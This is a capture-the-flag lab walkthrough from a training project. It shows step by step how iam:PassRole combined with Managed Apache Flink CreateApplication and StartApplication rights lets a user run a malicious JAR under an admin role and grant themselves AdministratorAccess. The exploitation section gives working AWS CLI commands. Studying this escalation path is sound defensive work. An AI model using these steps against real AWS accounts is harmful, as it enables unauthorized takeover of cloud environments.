# Guided Walkthrough: Privilege Escalation via iam:PassRole + kinesisanalytics:CreateApplication + kinesisanalytics:StartApplication

This scenario demonstrates a privilege escalation where a user with `iam:PassRole`, `kinesisanalytics:CreateApplication`, and `kinesisanalytics:StartApplication` permissions can create a Managed Apache Flink application referencing a malicious JAR in S3, start it with an admin service execution role, and use the running job to attach `AdministratorAccess` to themselves.

Managed Apache Flink (formerly Kinesis Data Analytics v2) removes the cluster-provisioning overhead of traditional Flink -- you supply a JAR and a service execution role, and the platform runs the job. The service execution role is what the Flink workers use for all AWS API calls inside the job. When that role is administrative, the JAR can call any IAM action on behalf of the service. The attacker stages a malicious JAR in an S3 bucket they control (or an attacker-controlled bucket with a resource policy granting the prod account read access), points the application at it, and the JAR's code calls `iam:AttachUserPolicy` under the admin role's credentials.

This is the "PassRole + Compute Service" privilege escalation pattern applied to Managed Apache Flink, similar to the Glue, Batch, EMR, and EMR Serverless variants, but with a compiled Java JAR instead of a script.

## The Challenge

You start as `pl-prod-kinesisanalytics-001-to-admin-starting-user` -- an IAM user with `iam:PassRole` (scoped to the admin role), `kinesisanalytics:CreateApplication`, and `kinesisanalytics:StartApplication`. Your goal is to reach effective administrator access in the account.

There is also an IAM role, `pl-prod-kinesisanalytics-001-to-admin-admin-role`, with `AdministratorAccess` attached. This role trusts `kinesisanalytics.amazonaws.com`, which means the Managed Apache Flink service can assume it as the service execution role for an application.

A pre-built exploit JAR lives in an attacker-controlled S3 bucket (the bucket policy grants the prod account `s3:GetObject` access). The JAR calls `iam:AttachUserPolicy` against the starting user when the Flink job runs. The starting user does not have `s3:PutObject` -- the JAR is set up by infrastructure, not uploaded at attack time.

Can you weaponize the `CreateApplication` + `StartApplication` flow to make the admin role execute that JAR?

## Reconnaissance

Confirm your identity and verify that you don't already have admin access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-kinesisanalytics-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- you are not admin yet
```

The Terraform output for this scenario includes the admin role ARN and the S3 bucket and key where the exploit JAR lives. You'll need both for the next steps.

## Exploitation

### Step 1: Create the Managed Apache Flink application

The `CreateApplication` call does not start any compute -- it just registers the application definition, including the S3 location of the JAR and the service execution role. The `iam:PassRole` check fires here because you are specifying `ServiceExecutionRole` in the request.

```bash
ADMIN_ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-kinesisanalytics-001-to-admin-admin-role"
CODE_BUCKET="pl-kinesisanalytics-001-code-{attacker_account_id}-{suffix}"
CODE_KEY="exploit.jar"

aws kinesisanalyticsv2 create-application \
    --application-name pl-prod-kinesisanalytics-001-to-admin-app \
    --runtime-environment FLINK-1_19 \
    --service-execution-role "$ADMIN_ROLE_ARN" \
    --application-configuration "{
        \"ApplicationCodeConfiguration\": {
            \"CodeContent\": {
                \"S3ContentLocation\": {
                    \"BucketARN\": \"arn:aws:s3:::$CODE_BUCKET\",
                    \"FileKey\": \"$CODE_KEY\"
                }
            },
            \"CodeContentType\": \"ZIPFILE\"
        },
        \"FlinkApplicationConfiguration\": {
            \"ParallelismConfiguration\": {
                \"ConfigurationType\": \"CUSTOM\",
                \"Parallelism\": 1,
                \"ParallelismPerKPU\": 1
            }
        }
    }"
```

The application is created in `READY` state. No compute is running yet.

### Step 2: Start the application

`StartApplication` triggers the actual execution. The Managed Apache Flink service assumes the `ServiceExecutionRole` and begins executing the JAR. The malicious code inside the JAR runs with the admin role's credentials -- including full `iam:*` access -- via the service's internal credentials wiring.

```bash
aws kinesisanalyticsv2 start-application \
    --application-name pl-prod-kinesisanalytics-001-to-admin-app
```

### Step 3: Wait for the application to start and execute

Flink applications on Managed Apache Flink typically take 2-5 minutes to transition from `STARTING` to `RUNNING`. Poll `describe-application` until you see `RUNNING`, then wait a few more seconds for the exploit code to execute and the `iam:AttachUserPolicy` call to succeed.

```bash
aws kinesisanalyticsv2 describe-application \
    --application-name pl-prod-kinesisanalytics-001-to-admin-app \
    --query 'ApplicationDetail.ApplicationStatus' \
    --output text
# STARTING -> RUNNING
```

Once the application reaches `RUNNING`, the JAR's `main()` method has already executed and called `iam:AttachUserPolicy`. The job then terminates naturally because there is no streaming input to process.

## Verification

Wait about 15 seconds for the IAM policy change to propagate, then verify using the starting user credentials (not readonly credentials -- verifying with readonly would be a false positive since readonly has independent read permissions):

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-kinesisanalytics-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Successfully returns user list -- you have admin access
```

## Capture the Flag

Admin access isn't the finish line -- the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using the starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/kinesisanalytics-001-to-admin \
    --query 'Parameter.Value' --output text
# flag{...}  -- your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them -- only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Compute Service" pattern: `iam:PassRole` let you delegate the admin role to Managed Apache Flink as the service execution role, and `kinesisanalytics:StartApplication` let you trigger the execution of arbitrary code (the malicious JAR) under that role. The Flink worker assumed the admin role automatically via the service's internal credentials wiring, and the JAR called `iam:AttachUserPolicy` under those admin credentials -- permanently granting your starting user `AdministratorAccess`.

In real environments this pattern appears when data engineers are given Managed Apache Flink permissions to run streaming analytics jobs, but the service execution role they are allowed to pass is over-broad. Managed Apache Flink is especially subtle for this pattern because the JAR is a compiled binary (not a human-readable script like PySpark or Glue Python), the startup time is several minutes which delays detection, and the exploit code is embedded in a fat JAR that looks like a legitimate Flink application from the outside.
